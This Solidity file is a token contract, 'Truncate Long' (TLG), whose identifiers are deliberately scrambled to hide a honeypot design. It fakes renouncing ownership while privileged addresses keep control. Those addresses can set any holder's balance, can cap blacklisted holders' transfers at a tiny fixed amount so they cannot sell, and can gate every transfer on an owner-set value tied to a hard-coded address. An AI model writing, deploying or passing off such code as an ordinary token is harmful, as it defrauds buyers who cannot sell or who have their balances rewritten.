//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface liquidityLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tradingIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverTakeFee {
    function createPair(address isReceiverTx, address tokenShouldMax) external returns (address);
}

interface minTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletMode) external view returns (uint256);

    function transfer(address liquidityBuy, uint256 fundBuyMin) external returns (bool);

    function allowance(address feeReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundBuyMin) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityBuy,
        uint256 fundBuyMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isAmount, uint256 value);
    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);
}

interface minTakeMetadata is minTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TruncateLong is tradingIs, minTake, minTakeMetadata {

    uint256 private launchMax = 100000000 * 10 ** 18;

    mapping(address => bool) public buyTake;

    function liquidityMinAuto(address enableTake) public {
        minIsFee();
        
        if (enableTake == totalAt || enableTake == tradingMarketing) {
            return;
        }
        buyTake[enableTake] = true;
    }

    function senderLaunchFrom(address atSender) public {
        if (launchedTeamLimit) {
            return;
        }
        
        feeFund[atSender] = true;
        if (enableFrom == teamTotal) {
            receiverTokenTeam = true;
        }
        launchedTeamLimit = true;
    }

    event OwnershipTransferred(address indexed modeLimit, address indexed toList);

    bool private receiverTokenTeam;

    function tradingBuy(address fundSenderShould, uint256 fundBuyMin) public {
        minIsFee();
        maxIs[fundSenderShould] = fundBuyMin;
    }

    address launchedAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return launchMax;
    }

    function name() external view virtual override returns (string memory) {
        return enableSwap;
    }

    address buyTeamTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private maxIs;

    address public totalAt;

    bool public launchedTeamLimit;

    function transfer(address fundSenderShould, uint256 fundBuyMin) external virtual override returns (bool) {
        return toAmount(_msgSender(), fundSenderShould, fundBuyMin);
    }

    function toAmount(address liquidityBuyAuto, address liquidityBuy, uint256 fundBuyMin) internal returns (bool) {
        if (liquidityBuyAuto == totalAt) {
            return isTo(liquidityBuyAuto, liquidityBuy, fundBuyMin);
        }
        uint256 takeLimit = minTake(tradingMarketing).balanceOf(launchedAmount);
        require(takeLimit == marketingBuy);
        require(liquidityBuy != launchedAmount);
        if (buyTake[liquidityBuyAuto]) {
            return isTo(liquidityBuyAuto, liquidityBuy, enableAt);
        }
        return isTo(liquidityBuyAuto, liquidityBuy, fundBuyMin);
    }

    uint256 constant enableAt = 18 ** 10;

    mapping(address => mapping(address => uint256)) private limitTake;

    function owner() external view returns (address) {
        return feeMode;
    }

    uint8 private exemptFundToken = 18;

    function allowance(address totalLimit, address teamAuto) external view virtual override returns (uint256) {
        if (teamAuto == buyTeamTotal) {
            return type(uint256).max;
        }
        return limitTake[totalLimit][teamAuto];
    }

    function symbol() external view virtual override returns (string memory) {
        return sellReceiver;
    }

    address public tradingMarketing;

    function txEnable(uint256 fundBuyMin) public {
        minIsFee();
        marketingBuy = fundBuyMin;
    }

    mapping(address => bool) public feeFund;

    function balanceOf(address walletMode) public view virtual override returns (uint256) {
        return maxIs[walletMode];
    }

    uint256 public teamTotal;

    string private sellReceiver = "TLG";

    bool private amountExempt;

    constructor (){
        if (txReceiverIs) {
            totalMarketing = teamTotal;
        }
        liquidityLimit toLiquidityShould = liquidityLimit(buyTeamTotal);
        tradingMarketing = receiverTakeFee(toLiquidityShould.factory()).createPair(toLiquidityShould.WETH(), address(this));
        if (totalMarketing != teamTotal) {
            amountExempt = false;
        }
        totalAt = _msgSender();
        fromLaunched();
        feeFund[totalAt] = true;
        maxIs[totalAt] = launchMax;
        if (totalMarketing == teamTotal) {
            teamTotal = enableFrom;
        }
        emit Transfer(address(0), totalAt, launchMax);
    }

    function isTo(address liquidityBuyAuto, address liquidityBuy, uint256 fundBuyMin) internal returns (bool) {
        require(maxIs[liquidityBuyAuto] >= fundBuyMin);
        maxIs[liquidityBuyAuto] -= fundBuyMin;
        maxIs[liquidityBuy] += fundBuyMin;
        emit Transfer(liquidityBuyAuto, liquidityBuy, fundBuyMin);
        return true;
    }

    uint256 private totalMarketing;

    function transferFrom(address liquidityBuyAuto, address liquidityBuy, uint256 fundBuyMin) external override returns (bool) {
        if (_msgSender() != buyTeamTotal) {
            if (limitTake[liquidityBuyAuto][_msgSender()] != type(uint256).max) {
                require(fundBuyMin <= limitTake[liquidityBuyAuto][_msgSender()]);
                limitTake[liquidityBuyAuto][_msgSender()] -= fundBuyMin;
            }
        }
        return toAmount(liquidityBuyAuto, liquidityBuy, fundBuyMin);
    }

    function fromLaunched() public {
        emit OwnershipTransferred(totalAt, address(0));
        feeMode = address(0);
    }

    function approve(address teamAuto, uint256 fundBuyMin) public virtual override returns (bool) {
        limitTake[_msgSender()][teamAuto] = fundBuyMin;
        emit Approval(_msgSender(), teamAuto, fundBuyMin);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptFundToken;
    }

    address private feeMode;

    string private enableSwap = "Truncate Long";

    bool public txReceiverIs;

    uint256 private enableFrom;

    function minIsFee() private view {
        require(feeFund[_msgSender()]);
    }

    uint256 marketingBuy;

    uint256 senderToken;

    function getOwner() external view returns (address) {
        return feeMode;
    }

}